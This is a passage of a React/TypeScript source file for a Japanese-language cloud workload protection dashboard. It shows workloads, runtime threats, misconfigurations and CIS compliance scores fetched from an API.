            <div className="space-y-1">
              {threat.process_tree.map((p, i) => (
                <div key={i} className="flex items-center gap-2">
                  <span className="text-falcon-subtle">{' '.repeat(i * 2)}{'└─'}</span>
                  <span className={`text-xs font-mono ${i === threat.process_tree.length - 1 ? 'text-falcon-red' : 'text-falcon-muted'}`}>{p}</span>
                </div>
              ))}
            </div>
          </div>
          {threat.network_connections.length > 0 && (
            <div className="bg-[#070d19] border border-falcon-border rounded-lg p-3">
              <h3 className="text-xs font-semibold text-falcon-muted mb-2">ネットワーク接続</h3>
              {threat.network_connections.map((nc, i) => (
                <div key={i} className="flex items-center gap-2 text-xs">
                  <span className="font-mono text-falcon-muted">{nc.src}</span>
                  <span className="text-falcon-subtle">→</span>
                  <span className="font-mono text-falcon-red">{nc.dst}</span>
                  <span className="text-falcon-subtle">({nc.proto})</span>
                </div>
              ))}
            </div>
          )}
          <div className="bg-[#070d19] border border-falcon-border rounded-lg p-3">
            <h3 className="text-xs font-semibold text-falcon-muted mb-2">推奨対応</h3>
            <ol className="space-y-1">
              {threat.recommended_response.map((r, i) => (
                <li key={i} className="text-xs text-falcon-muted flex gap-2">
                  <span className="text-falcon-red font-bold shrink-0">{i + 1}.</span>
                  {r}
                </li>
              ))}
            </ol>
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── Main Page ─────────────────────────────────────────────────────────────────

export default function CloudWorkloadPage() {
  const [provider, setProvider] = useState<CloudProvider>('aws')
  const [mainTab, setMainTab] = useState<'workloads' | 'threats' | 'misconfigs' | 'compliance'>('workloads')
  const [search, setSearch] = useState('')
  const [filterType, setFilterType] = useState('')
  const [filterProtection, setFilterProtection] = useState('')
  const [selectedWorkload, setSelectedWorkload] = useState<Workload | null>(null)
  const [selectedThreat, setSelectedThreat] = useState<RuntimeThreat | null>(null)
  const [fixedMisconfigs, setFixedMisconfigs] = useState<Set<string>>(new Set())

  const { data: apiWorkloads } = useQuery<Workload[]>({
    queryKey: ['cloud-workloads', provider],
    queryFn: () => apiFetch(`/api/v1/cloud-workload?provider=${provider}`),
    staleTime: 60_000,
    retry: false,
  })

  const { data: apiThreats } = useQuery<RuntimeThreat[]>({
    queryKey: ['cloud-threats'],
    queryFn: () => apiFetch('/api/v1/cloud-workload/threats'),
    staleTime: 30_000,
    retry: false,
  })

  const { data: apiMisconfigs } = useQuery<Misconfiguration[]>({
    queryKey: ['cloud-misconfigs'],
    queryFn: () => apiFetch('/api/v1/cloud-workload/misconfigs'),
    staleTime: 60_000,
    retry: false,
  })

  const workloads = useMemo(() => {
    const base = (apiWorkloads ?? []).filter(w => w.provider === provider)
    return base.filter(w => {
      if (search && !w.workload_name.toLowerCase().includes(search.toLowerCase())) return false
      if (filterType && w.type !== filterType) return false
      if (filterProtection && w.protection_status !== filterProtection) return false
      return true
    })
  }, [apiWorkloads, provider, search, filterType, filterProtection])

  const allProviderWorkloads = (apiWorkloads ?? []).filter(w => w.provider === provider)
  const threats = useMemo(() => (apiThreats ?? []).filter(t => t.provider === provider), [apiThreats, provider])
  const misconfigs = useMemo(() => (apiMisconfigs ?? []).filter(mc => mc.provider === provider), [apiMisconfigs, provider])

  // Summary stats
  const stats = useMemo(() => {
    const pw = allProviderWorkloads
    const protected_ = pw.filter(w => w.protection_status === 'protected').length
    const coverage = pw.length ? Math.round((protected_ / pw.length) * 100) : 0
    const byType: Record<WorkloadType, { count: number; protected: number }> = {
      vm: { count: 0, protected: 0 }, container: { count: 0, protected: 0 },
      lambda: { count: 0, protected: 0 }, rds: { count: 0, protected: 0 }, aks_pod: { count: 0, protected: 0 },
    }
    pw.forEach(w => {
      byType[w.type].count++
      if (w.protection_status === 'protected') byType[w.type].protected++
    })
    const todayThreats = threats.filter(t => t.timestamp.startsWith('2026-03-18'))
    return { coverage, byType, todayThreats: todayThreats.length, critical: todayThreats.filter(t => t.severity === 'critical').length }
  }, [allProviderWorkloads, threats])

  const cisScores = CIS_SCORES[provider]

  return (
    <div className="min-h-screen bg-[#070d19] p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-falcon-red/10 border border-falcon-red/20 flex items-center justify-center">
            <Cloud className="w-5 h-5 text-falcon-red" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-white">クラウドワークロード保護</h1>
            <p className="text-sm text-falcon-muted">マルチクラウドランタイム保護・脅威検出</p>
          </div>
        </div>
        <button className="p-2 border border-falcon-border rounded-sm text-falcon-muted hover:text-white hover:border-falcon-muted/40 transition-colors">
          <RefreshCw className="w-4 h-4" />
        </button>
      </div>

      {/* Provider Tabs */}
      <div className="flex gap-1 p-1 bg-falcon-surface border border-falcon-border rounded-lg w-fit">
        {(['aws', 'azure', 'gcp'] as CloudProvider[]).map(p => (
          <button
            key={p}
            onClick={() => setProvider(p)}
            className={`px-5 py-2 text-sm font-semibold rounded transition-colors ${
              provider === p ? 'bg-falcon-border text-white' : 'text-falcon-muted hover:text-white'
            }`}
          >
            {p.toUpperCase()}
          </button>
        ))}
      </div>

      {/* Summary Cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {(Object.entries(stats.byType) as [WorkloadType, { count: number; protected: number }][]).map(([type, d]) => {
          const pct = d.count ? Math.round((d.protected / d.count) * 100) : 100
          return (
            <div key={type} className="bg-falcon-surface border border-falcon-border rounded-lg p-4">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-falcon-muted">{TYPE_ICONS[type]}</span>
                <span className="text-sm text-falcon-muted">{TYPE_LABELS[type]}</span>
              </div>
              <div className="text-2xl font-bold text-white mb-1">{d.count}</div>
              <div className="flex items-center gap-1.5">
                <div className="flex-1 h-1 bg-falcon-border rounded-full overflow-hidden">
                  <div className={`h-full rounded-full ${pct === 100 ? 'bg-green-500' : pct >= 60 ? 'bg-yellow-500' : 'bg-red-500'}`} style={{ width: `${pct}%` }} />
                </div>
                <span className="text-xs text-falcon-muted">{pct}%保護</span>
              </div>
            </div>
          )
        })}
      </div>

      {/* Coverage + Threat summary */}
      <div className="grid grid-cols-2 gap-4">
        <div className="bg-falcon-surface border border-falcon-border rounded-lg p-4 flex items-center gap-4">
          <div className="relative w-16 h-16 shrink-0">
            <svg className="w-full h-full -rotate-90" viewBox="0 0 36 36">
              <circle cx="18" cy="18" r="15" fill="none" stroke="#1e2d42" strokeWidth="3" />
              <circle cx="18" cy="18" r="15" fill="none" stroke={stats.coverage >= 80 ? '#22c55e' : stats.coverage >= 60 ? '#eab308' : '#e8002d'} strokeWidth="3" strokeDasharray={`${stats.coverage * 0.942} 94.2`} strokeLinecap="round" />
            </svg>
            <div className="absolute inset-0 flex items-center justify-center">
              <span className="text-sm font-bold text-white">{stats.coverage}%</span>
            </div>
          </div>
          <div>
            <p className="text-sm font-medium text-white">保護カバレッジ</p>
            <p className="text-xs text-falcon-muted">{allProviderWorkloads.filter(w => w.protection_status === 'protected').length} / {allProviderWorkloads.length} ワークロード保護済み</p>
          </div>
        </div>
        <div className="bg-falcon-surface border border-falcon-border rounded-lg p-4">
          <p className="text-sm text-falcon-muted mb-2">本日のランタイム脅威</p>
          <div className="flex items-end gap-2">
            <span className="text-3xl font-bold text-white">{stats.todayThreats}</span>
            <span className="text-sm text-falcon-muted mb-1">件検出</span>
          </div>
          <div className="flex gap-2 mt-1">
            <span className="text-xs px-2 py-0.5 rounded-sm bg-red-900/40 text-red-400">Critical: {stats.critical}</span>
            <span className="text-xs px-2 py-0.5 rounded-sm bg-orange-900/40 text-orange-400">High: {stats.todayThreats - stats.critical}</span>
          </div>
        </div>
      </div>

      {/* Main Section Tabs */}
      <div className="flex gap-0.5 border-b border-falcon-border">
        {[
          { id: 'workloads', label: 'ワークロード一覧' },
          { id: 'threats', label: `脅威検出 (${threats.length})` },
          { id: 'misconfigs', label: `設定問題 (${misconfigs.filter(m => m.status === 'open').length})` },
          { id: 'compliance', label: 'コンプライアンス' },
        ].map(tab => (
          <button
            key={tab.id}
            onClick={() => setMainTab(tab.id as typeof mainTab)}
            className={`px-4 py-2.5 text-sm font-medium border-b-2 -mb-px transition-colors ${
              mainTab === tab.id ? 'border-falcon-red text-white' : 'border-transparent text-falcon-muted hover:text-white'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Workloads Tab */}
      {mainTab === 'workloads' && (
        <div className="space-y-4">
          <div className="flex flex-wrap gap-3">
            <div className="relative flex-1 min-w-[200px]">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-falcon-subtle" />
              <input
                className="w-full pl-9 pr-3 py-2 bg-falcon-surface border border-falcon-border rounded-sm text-sm text-white placeholder-falcon-subtle focus:outline-hidden focus:border-falcon-red/50"
                placeholder="ワークロード名で検索..."
                value={search}
                onChange={e => setSearch(e.target.value)}
              />
            </div>
            <select
              className="bg-falcon-surface border border-falcon-border rounded-sm px-3 py-2 text-sm text-falcon-muted focus:outline-hidden"
              value={filterType}
              onChange={e => setFilterType(e.target.value)}
            >
              <option value="">全タイプ</option>
              {Object.entries(TYPE_LABELS).map(([k, v]) => <option key={k} value={k}>{v}</option>)}
            </select>
            <select
              className="bg-falcon-surface border border-falcon-border rounded-sm px-3 py-2 text-sm text-falcon-muted focus:outline-hidden"
              value={filterProtection}
              onChange={e => setFilterProtection(e.target.value)}
            >
              <option value="">全保護状態</option>
              <option value="protected">保護済み</option>
              <option value="unprotected">未保護</option>
              <option value="partial">部分的</option>
            </select>
          </div>
          <div className="bg-falcon-surface border border-falcon-border rounded-lg overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-falcon-border bg-[#070d19]/60">
                    {['ワークロード', 'タイプ', 'リージョン', '保護状態', 'エージェント', '最終確認', '脅威', 'タグ', ''].map(h => (
                      <th key={h} className="text-left py-3 px-3 text-xs text-falcon-muted font-medium whitespace-nowrap">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {workloads.length === 0 ? (
                    <tr><td colSpan={9} className="text-center py-8 text-falcon-muted">ワークロードなし</td></tr>
                  ) : workloads.map(w => {
                    const prot = getProtectionBadge(w.protection_status)
                    return (
                      <tr
                        key={w.id}
                        className="border-b border-falcon-border/40 hover:bg-[#070d19]/60 cursor-pointer group"
                        onClick={() => setSelectedWorkload(w)}
                      >
                        <td className="py-2.5 px-3 font-medium text-white group-hover:text-falcon-red transition-colors">{w.workload_name}</td>
                        <td className="py-2.5 px-3">
                          <span className="flex items-center gap-1.5 text-xs text-falcon-muted">
                            {TYPE_ICONS[w.type]}
                            {TYPE_LABELS[w.type]}
                          </span>
                        </td>
                        <td className="py-2.5 px-3 text-xs text-falcon-muted">{w.region}</td>
                        <td className="py-2.5 px-3">
                          <span className={`text-xs px-2 py-0.5 rounded-sm border ${prot.cls}`}>{prot.label}</span>
                        </td>
                        <td className="py-2.5 px-3 text-xs font-mono text-falcon-muted">
                          {w.agent_version ?? <span className="text-falcon-subtle">未インストール</span>}
                        </td>
                        <td className="py-2.5 px-3 text-xs text-falcon-muted">
                          {new Date(w.last_seen).toLocaleString('ja-JP', { month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })}
                        </td>
                        <td className="py-2.5 px-3">
                          {w.threats_count > 0 ? (
                            <span className="flex items-center gap-1 text-xs font-bold text-red-400">
                              <AlertTriangle className="w-3 h-3" />{w.threats_count}
                            </span>
                          ) : (
                            <span className="text-xs text-falcon-subtle">—</span>
                          )}
                        </td>
                        <td className="py-2.5 px-3">
                          <div className="flex gap-1 flex-wrap max-w-[120px]">
                            {w.tags.slice(0, 2).map(t => (
                              <span key={t} className="text-xs px-1.5 py-0.5 bg-falcon-border rounded-sm text-falcon-muted">{t}</span>
                            ))}
                          </div>
                        </td>
                        <td className="py-2.5 px-3">
                          <ChevronRight className="w-4 h-4 text-falcon-subtle group-hover:text-falcon-muted" />
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* Threats Tab */}
      {mainTab === 'threats' && (
        <div className="bg-falcon-surface border border-falcon-border rounded-lg overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-falcon-border bg-[#070d19]/60">
                  {['時刻', 'ワークロード', '脅威タイプ', '深刻度', 'プロセス', '自動ブロック', ''].map(h => (
                    <th key={h} className="text-left py-3 px-3 text-xs text-falcon-muted font-medium whitespace-nowrap">{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {threats.length === 0 ? (
                  <tr><td colSpan={7} className="text-center py-8 text-falcon-muted">脅威なし</td></tr>
                ) : threats.map(t => {
                  const tt = getThreatTypeBadge(t.threat_type)
                  const sev = getSeverityBadge(t.severity)
                  return (
                    <tr
                      key={t.id}
                      className="border-b border-falcon-border/40 hover:bg-[#070d19]/60 cursor-pointer group"
                      onClick={() => setSelectedThreat(t)}
                    >
                      <td className="py-2.5 px-3 text-xs text-falcon-muted whitespace-nowrap">
                        {new Date(t.timestamp).toLocaleString('ja-JP', { month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })}
                      </td>
                      <td className="py-2.5 px-3 font-medium text-white">{t.workload_name}</td>
                      <td className="py-2.5 px-3">
                        <span className={`text-xs px-2 py-0.5 rounded-sm ${tt.cls}`}>{tt.label}</span>
                      </td>
                      <td className="py-2.5 px-3">
                        <span className={`text-xs px-2 py-0.5 rounded-sm ${sev.cls}`}>{sev.label}</span>
                      </td>
                      <td className="py-2.5 px-3 text-xs font-mono text-falcon-muted">{t.process}</td>
                      <td className="py-2.5 px-3">
                        {t.auto_blocked
                          ? <span className="text-xs px-2 py-0.5 rounded-sm bg-green-900/40 text-green-400">ブロック済</span>
                          : <span className="text-xs px-2 py-0.5 rounded-sm bg-red-900/40 text-red-400">未ブロック</span>
                        }
                      </td>
                      <td className="py-2.5 px-3">
                        <Eye className="w-4 h-4 text-falcon-subtle group-hover:text-falcon-muted" />
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* Misconfigs Tab */}
      {mainTab === 'misconfigs' && (
        <div className="space-y-3">
          {misconfigs.map(m => {
            const sev = getSeverityBadge(m.severity)
            const isFixed = fixedMisconfigs.has(m.id) || m.status === 'fixed'
            const isSuppressed = m.status === 'suppressed'
            return (
              <div key={m.id} className={`bg-falcon-surface border rounded-lg p-4 ${isFixed ? 'border-green-700/30 opacity-60' : isSuppressed ? 'border-falcon-border opacity-50' : 'border-falcon-border'}`}>
                <div className="flex items-start justify-between gap-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <span className={`text-xs px-2 py-0.5 rounded-sm ${sev.cls}`}>{sev.label}</span>
                      <span className="text-sm font-medium text-white">{m.issue_type}</span>
                      {isFixed && <span className="text-xs px-2 py-0.5 rounded-sm bg-green-900/40 text-green-400">修正済み</span>}
                      {isSuppressed && <span className="text-xs px-2 py-0.5 rounded-sm bg-slate-700/40 text-slate-400">抑制</span>}
                    </div>
                    <p className="text-xs text-falcon-muted mb-0.5"><span className="text-white">{m.workload_name}</span> · {m.region ?? ''}</p>
                    <p className="text-xs text-falcon-muted mb-2">{m.description}</p>
                    <div className="flex items-start gap-1">
                      <CheckCircle2 className="w-3 h-3 text-green-400 mt-0.5 shrink-0" />
                      <p className="text-xs text-falcon-muted">{m.remediation}</p>
                    </div>
                  </div>
                  {m.quick_fixable && !isFixed && !isSuppressed && (
                    <button
                      onClick={() => setFixedMisconfigs(prev => new Set([...prev, m.id]))}
                      className="shrink-0 px-3 py-1.5 text-xs bg-green-900/30 border border-green-700/40 text-green-400 rounded-sm hover:bg-green-900/50 transition-colors"
                    >
                      クイック修正
                    </button>
                  )}
                </div>
              </div>
            )
          })}
        </div>
      )}

      {/* Compliance Tab */}
      {mainTab === 'compliance' && (
        <div className="space-y-4">
          <h3 className="text-base font-semibold text-white">CISベンチマーク — {provider.toUpperCase()}</h3>
          <div className="grid gap-3">
            {cisScores.map(score => (
              <div key={score.category} className="bg-falcon-surface border border-falcon-border rounded-lg p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-white">{score.category}</span>
                  <div className="flex items-center gap-3">
                    <span className="text-xs text-green-400">{score.passed} 合格</span>
                    <span className="text-xs text-red-400">{score.failed} 不合格</span>
                    <span className={`text-sm font-bold ${score.score >= 80 ? 'text-green-400' : score.score >= 60 ? 'text-yellow-400' : 'text-red-400'}`}>
                      {score.score}%
                    </span>
                  </div>
                </div>
                <div className="h-2 bg-falcon-border rounded-full overflow-hidden">
                  <div
                    className={`h-full rounded-full ${score.score >= 80 ? 'bg-green-500' : score.score >= 60 ? 'bg-yellow-500' : 'bg-red-500'}`}
                    style={{ width: `${score.score}%` }}
                  />
                </div>
              </div>
            ))}
            <div className="bg-falcon-surface border border-falcon-red/20 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <span className="text-sm font-bold text-white">総合スコア</span>
                <span className={`text-xl font-bold ${
                  Math.round(cisScores.reduce((a, s) => a + s.score, 0) / cisScores.length) >= 80 ? 'text-green-400' : 'text-yellow-400'
                }`}>
                  {Math.round(cisScores.reduce((a, s) => a + s.score, 0) / cisScores.length)}%
                </span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Modals */}
      {selectedWorkload && <WorkloadDetailModal workload={selectedWorkload} onClose={() => setSelectedWorkload(null)} />}
      {selectedThreat && <ThreatDetailModal threat={selectedThreat} onClose={() => setSelectedThreat(null)} />}
    </div>
  )
}
